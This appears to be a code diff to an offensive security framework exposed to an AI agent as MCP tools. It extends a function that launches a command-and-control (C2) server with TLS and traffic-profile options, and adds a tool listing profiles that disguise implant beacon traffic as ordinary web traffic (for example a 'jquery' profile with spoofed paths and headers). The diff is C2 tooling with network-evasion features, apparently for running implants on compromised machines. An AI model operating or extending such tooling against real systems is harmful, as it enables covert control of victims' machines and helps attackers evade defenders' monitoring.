@@ -180,9 +180,35 @@ def ursa_start_c2(port: int = 8443, host: str = "0.0.0.0") -> str:
         except (ProcessLookupError, ValueError):
             os.unlink(C2_PID_FILE)
 
+    # Build command — pull TLS/profile from config if set
+    cmd = [
+        VENV_PYTHON, str(PROJECT_ROOT / "major" / "server.py"),
+        "--port", str(port),
+        "--host", host,
+    ]
+
+    # Read active config for TLS / profile defaults
+    try:
+        sys.path.insert(0, str(PROJECT_ROOT))
+        from major.config import get_config as _gc
+        cfg = _gc()
+        if cfg.get("major.tls.enabled", False):
+            cmd.append("--tls")
+            cp = cfg.get("major.tls.cert_path", "")
+            kp = cfg.get("major.tls.key_path", "")
+            if cp:
+                cmd += ["--cert", cp]
+            if kp:
+                cmd += ["--key", kp]
+        profile = cfg.get("major.traffic_profile", "default")
+        if profile and profile != "default":
+            cmd += ["--traffic-profile", profile]
+    except Exception:
+        pass
+
     # Start C2 server
     proc = subprocess.Popen(
-        [VENV_PYTHON, str(PROJECT_ROOT / "major" / "server.py"), "--port", str(port), "--host", host],
+        cmd,
         cwd=str(PROJECT_ROOT),
         stdout=open(str(PROJECT_ROOT / "major" / "c2.log"), "a"),
         stderr=subprocess.STDOUT,
@@ -2276,6 +2302,59 @@ def ursa_post_run(module: str, args: dict | None = None) -> str:
                          json.dumps(result["data"], indent=2, default=str)]
 
     return "\n".join(output_parts)
+
+
+@mcp_server.tool()
+def ursa_traffic_profiles() -> str:
+    """
+    List available traffic profiles for the C2 server.
+
+    Traffic profiles control how C2 HTTP traffic looks on the wire:
+    which URL paths implants beacon to, what Server/response headers
+    are returned, and (optionally) what User-Agent implants must send.
+
+    Active profile is set via  major.traffic_profile  in ursa.yaml,
+    or with  --traffic-profile  when starting the C2 server.
+    """
+    try:
+        from major.profiles import list_profiles, get_profile, PROFILES
+
+        profiles = list_profiles()
+        lines = [
+            "Available C2 Traffic Profiles",
+            "=" * 45,
+        ]
+        for p in profiles:
+            lines.append(f"\n  {p['name']}")
+            lines.append(f"    {p['description']}")
+            lines.append(f"    Server header: {p['server_header']}")
+            lines.append(f"    Endpoints: {p['endpoints']}")
+
+            # Show URL mappings
+            full = get_profile(p["name"])
+            for logical, path in full.urls.items():
+                lines.append(f"      {logical:10s} → {path}")
+
+            # Show extra response headers
+            if full.response_headers:
+                lines.append("    Response headers:")
+                for k, v in full.response_headers.items():
+                    lines.append(f"      {k}: {v}")
+
+        lines += [
+            "",
+            "To activate a profile:",
+            "  1. Set in ursa.yaml:  major.traffic_profile: jquery",
+            "  2. Restart C2:        ursa_stop_c2() then ursa_start_c2()",
+            "",
+            "Note: Implants must be rebuilt with the matching profile paths.",
+            "Use the builder extra_tokens from profile.builder_tokens().",
+        ]
+
+        return "\n".join(lines)
+
+    except Exception as e:
+        return f"Error listing profiles: {e}"
 
 
 if __name__ == "__main__":
